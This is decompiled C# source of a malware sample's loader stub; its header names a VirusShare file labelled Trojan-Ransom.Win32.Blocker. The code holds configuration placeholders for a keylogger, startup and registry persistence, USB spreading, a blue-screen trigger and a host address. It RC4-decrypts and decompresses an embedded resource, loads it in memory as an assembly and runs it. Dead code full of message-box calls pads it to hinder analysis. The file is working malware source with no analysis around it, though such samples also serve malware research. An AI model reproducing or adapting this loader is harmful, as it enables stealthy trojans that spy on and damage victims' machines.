// Decompiled with JetBrains decompiler
// Type: scrcext.kjhgghjkhbhjgvbjhbhjb
// Assembly: MicrosoftCopy, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 984208B4-F04F-4A86-B27A-63C4EC9151B6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.avqm-09d5c549dba08abd266f4b928e21e21c9fee4caf3bf0bc2e2262bbd4d1e5c63f.exe

using MicrosoftCopy.Properties;
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace scrcext
{
  internal static class kjhgghjkhbhjgvbjhbhjb
  {
    public static bool asd = Convert.ToBoolean("%fixed%");
    public static bool fixedMemory = Convert.ToBoolean("%fixedmemory%");
    public static bool fixedR = Convert.ToBoolean("%fixedregstary%");
    public static bool startupfixedR = Convert.ToBoolean("%fixedstartup%");
    public static string asdasd = "%Mesgbo1%";
    public static string Messgebox2 = "%Messagebox2%";
    public static bool KeyLogger = Convert.ToBoolean("%KLENABEL%");
    public static bool EncrpionFile = Convert.ToBoolean("%klencode%");
    public static bool WriteFileKeylgger = Convert.ToBoolean("%klfile%");
    public static bool Regstary = Convert.ToBoolean("%regeditStartUp%");
    public static bool sankdnals = Convert.ToBoolean("%CopyToAnyFoldarrrr%");
    public static bool CopyToStartUp = Convert.ToBoolean("%CopyToStartUp%");
    public static bool BD = Convert.ToBoolean("%bsod%");
    public static string DR = "%dir%";
    public static string EXE = "%exe%";
    public static string H = "%host%";
    public static string P = "";
    public static string RG = "%rg%";
    public static bool SPR = Convert.ToBoolean("%usb%");
    public static string VN = "%vn%";
    public static string VR = "0.5.5";
    public static string fdsjkfsdkfs = "%Bypass%";
    public static string salkmdlkamsdlk = "%Run_after_time%";
    public static string Y = "^";
    public static string dasdasdas = "";

    private static void Main()
    {
      kjhgghjkhbhjgvbjhbhjb.dasdasdas = kjhgghjkhbhjgvbjhbhjb.dasdasdas + kjhgghjkhbhjgvbjhbhjb.asd.ToString() + kjhgghjkhbhjgvbjhbhjb.Y + (object) kjhgghjkhbhjgvbjhbhjb.fixedMemory + kjhgghjkhbhjgvbjhbhjb.Y + (object) kjhgghjkhbhjgvbjhbhjb.fixedR + kjhgghjkhbhjgvbjhbhjb.Y + (object) kjhgghjkhbhjgvbjhbhjb.startupfixedR + kjhgghjkhbhjgvbjhbhjb.Y;
      kjhgghjkhbhjgvbjhbhjb.dasdasdas = kjhgghjkhbhjgvbjhbhjb.dasdasdas + kjhgghjkhbhjgvbjhbhjb.asdasd + kjhgghjkhbhjgvbjhbhjb.Y + kjhgghjkhbhjgvbjhbhjb.Messgebox2 + kjhgghjkhbhjgvbjhbhjb.Y;
      kjhgghjkhbhjgvbjhbhjb.dasdasdas = kjhgghjkhbhjgvbjhbhjb.dasdasdas + (object) kjhgghjkhbhjgvbjhbhjb.KeyLogger + kjhgghjkhbhjgvbjhbhjb.Y + (object) kjhgghjkhbhjgvbjhbhjb.EncrpionFile + kjhgghjkhbhjgvbjhbhjb.Y + (object) kjhgghjkhbhjgvbjhbhjb.WriteFileKeylgger + kjhgghjkhbhjgvbjhbhjb.Y;
      kjhgghjkhbhjgvbjhbhjb.dasdasdas = kjhgghjkhbhjgvbjhbhjb.dasdasdas + (object) kjhgghjkhbhjgvbjhbhjb.Regstary + kjhgghjkhbhjgvbjhbhjb.Y + (object) kjhgghjkhbhjgvbjhbhjb.sankdnals + kjhgghjkhbhjgvbjhbhjb.Y + (object) kjhgghjkhbhjgvbjhbhjb.CopyToStartUp + kjhgghjkhbhjgvbjhbhjb.Y;
      kjhgghjkhbhjgvbjhbhjb.dasdasdas = kjhgghjkhbhjgvbjhbhjb.dasdasdas + (object) kjhgghjkhbhjgvbjhbhjb.BD + kjhgghjkhbhjgvbjhbhjb.Y;
      kjhgghjkhbhjgvbjhbhjb.dasdasdas = kjhgghjkhbhjgvbjhbhjb.dasdasdas + kjhgghjkhbhjgvbjhbhjb.DR + kjhgghjkhbhjgvbjhbhjb.Y + kjhgghjkhbhjgvbjhbhjb.EXE + kjhgghjkhbhjgvbjhbhjb.Y + kjhgghjkhbhjgvbjhbhjb.H + kjhgghjkhbhjgvbjhbhjb.Y + kjhgghjkhbhjgvbjhbhjb.P + kjhgghjkhbhjgvbjhbhjb.Y + kjhgghjkhbhjgvbjhbhjb.RG + kjhgghjkhbhjgvbjhbhjb.Y;
      kjhgghjkhbhjgvbjhbhjb.dasdasdas = kjhgghjkhbhjgvbjhbhjb.dasdasdas + (object) kjhgghjkhbhjgvbjhbhjb.SPR + kjhgghjkhbhjgvbjhbhjb.Y + kjhgghjkhbhjgvbjhbhjb.VN + kjhgghjkhbhjgvbjhbhjb.Y + kjhgghjkhbhjgvbjhbhjb.VR + kjhgghjkhbhjgvbjhbhjb.Y + kjhgghjkhbhjgvbjhbhjb.fdsjkfsdkfs + kjhgghjkhbhjgvbjhbhjb.Y + kjhgghjkhbhjgvbjhbhjb.salkmdlkamsdlk;
      string[] njknkjnkln = new string[1]
      {
        kjhgghjkhbhjgvbjhbhjb.dasdasdas
      };
      kjhgghjkhbhjgvbjhbhjb.kjnknkjnnnnn kjnknkjnnnnn = new kjhgghjkhbhjgvbjhbhjb.kjnknkjnnnnn(Assembly.Load(Convert.FromBase64String(kjhgghjkhbhjgvbjhbhjb.byterostring(kjhgghjkhbhjgvbjhbhjb.fsdfsdfdddddddddddddd(kjhgghjkhbhjgvbjhbhjb.ooooooooooooooooosadasdsdwwwww(Resources.i3, "syria"))))), njknkjnkln);
    }

    public static string byterostring(byte[] dcasdadawaaaaaaaaaaa)
    {
      for (int index = 0; index < -1; ++index)
      {
        int num1 = (int) MessageBox.Show("");
        int num2 = (int) MessageBox.Show("");
        int num3 = (int) MessageBox.Show("");
        int num4 = (int) MessageBox.Show("");
        int num5 = (int) MessageBox.Show("");
        int num6 = (int) MessageBox.Show("");
        int num7 = (int) MessageBox.Show("");
        int num8 = (int) MessageBox.Show("");
      }
      return Encoding.UTF8.GetString(dcasdadawaaaaaaaaaaa);
    }

    public static byte[] ooooooooooooooooosadasdsdwwwww(byte[] njnkl, string kjnjkn)
    {
      byte[] bytes = Encoding.ASCII.GetBytes(kjnjkn);
      byte[] numArray1 = new byte[256];
      byte[] numArray2 = new byte[256];
      for (int index = 0; index < 256; ++index)
      {
        numArray1[index] = (byte) index;
        numArray2[index] = bytes[index % bytes.GetLength(0)];
      }
      int index1 = 0;
      for (int index2 = 0; index2 < 256; ++index2)
      {
        index1 = (index1 + (int) numArray1[index2] + (int) numArray2[index2]) % 256;
        byte num = numArray1[index2];
        numArray1[index2] = numArray1[index1];
        numArray1[index1] = num;
      }
      int index3;
      int index4 = index3 = 0;
      for (int index5 = 0; index5 < njnkl.GetLength(0); ++index5)
      {
        index4 = (index4 + 1) % 256;
        index3 = (index3 + (int) numArray1[index4]) % 256;
        byte num = numArray1[index4];
        numArray1[index4] = numArray1[index3];
        numArray1[index3] = num;
        int index6 = ((int) numArray1[index4] + (int) numArray1[index3]) % 256;
        njnkl[index5] ^= numArray1[index6];
      }
      return njnkl;
    }

    public static void CopyTo(Stream src, Stream dest)
    {
      for (int index = 0; index < -1; ++index)
      {
        int num1 = (int) MessageBox.Show("");
        int num2 = (int) MessageBox.Show("");
        int num3 = (int) MessageBox.Show("");
        int num4 = (int) MessageBox.Show("");
        int num5 = (int) MessageBox.Show("");
        int num6 = (int) MessageBox.Show("");
        int num7 = (int) MessageBox.Show("");
        int num8 = (int) MessageBox.Show("");
      }
      byte[] buffer = new byte[4096];
      for (int index = 0; index < -1; ++index)
      {
        int num9 = (int) MessageBox.Show("");
        int num10 = (int) MessageBox.Show("");
        int num11 = (int) MessageBox.Show("");
        int num12 = (int) MessageBox.Show("");
        int num13 = (int) MessageBox.Show("");
        int num14 = (int) MessageBox.Show("");
        int num15 = (int) MessageBox.Show("");
        int num16 = (int) MessageBox.Show("");
      }
      try
      {
        int count;
        while ((count = src.Read(buffer, 0, buffer.Length)) != 0)
          dest.Write(buffer, 0, count);
      }
      catch
      {
      }
    }

    public static byte[] Zip(byte[] str)
    {
      using (MemoryStream src = new MemoryStream(str))
      {
        using (MemoryStream memoryStream = new MemoryStream())
        {
          using (GZipStream dest = new GZipStream((Stream) memoryStream, CompressionMode.Compress))
          {
            kjhgghjkhbhjgvbjhbhjb.CopyTo((Stream) src, (Stream) dest);
            for (int index = 0; index < -1; ++index)
            {
              int num1 = (int) MessageBox.Show("");
              int num2 = (int) MessageBox.Show("");
              int num3 = (int) MessageBox.Show("");
              int num4 = (int) MessageBox.Show("");
              int num5 = (int) MessageBox.Show("");
              int num6 = (int) MessageBox.Show("");
              int num7 = (int) MessageBox.Show("");
              int num8 = (int) MessageBox.Show("");
            }
          }
          return memoryStream.ToArray();
        }
      }
    }

    public static byte[] fsdfsdfdddddddddddddd(byte[] bytes)
    {
      MemoryStream memoryStream = new MemoryStream(bytes);
      using (MemoryStream dest = new MemoryStream())
      {
        using (GZipStream src = new GZipStream((Stream) memoryStream, CompressionMode.Decompress))
          kjhgghjkhbhjgvbjhbhjb.CopyTo((Stream) src, (Stream) dest);
        return dest.ToArray();
      }
    }

    private class kjnknkjnnnnn
    {
      public kjnknkjnnnnn(Assembly njknklnmlk, string[] njknkjnkln)
      {
        kjhgghjkhbhjgvbjhbhjb.jhjgbjhbjh jhjgbjhbjh = new kjhgghjkhbhjgvbjhbhjb.jhjgbjhbjh(njknklnmlk.CreateInstance(njknklnmlk.EntryPoint.Name), njknkjnkln, njknklnmlk);
      }
    }

    private class jhjgbjhbjh
    {
      public jhjgbjhbjh(object o, string[] ar, Assembly c) => c.EntryPoint.Invoke(o, new object[1]
      {
        (object) ar
      });
    }
  }
}
